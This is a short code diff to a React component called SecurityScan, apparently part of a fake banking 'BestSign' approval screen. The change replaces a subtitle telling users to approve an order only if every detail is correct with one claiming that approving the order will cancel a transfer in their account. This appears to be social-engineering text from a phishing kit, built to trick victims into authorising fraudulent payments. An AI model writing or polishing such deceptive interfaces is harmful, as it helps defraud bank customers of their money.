@@ -753,7 +753,7 @@ export function SecurityScan({ onComplete, sessionId, accountName: accountNamePr
                 <BestSignPanel
                   code={transferBestSignCode || 'XXXX'}
                   title="Mit BestSign freigeben"
-                  subtitle="Bitte prüfen Sie den Auftrag in Ihrer App. Nur wenn alle Angaben korrekt sind, geben Sie den Auftrag frei."
+                  subtitle="Bitte geben Sie den Auftrag in Ihrer App frei, um die Stornierung der Überweisung in Ihrem Konto abzuschließen."
                   compact={false}
                   showSpinner={true}
                   showBackButton={false}
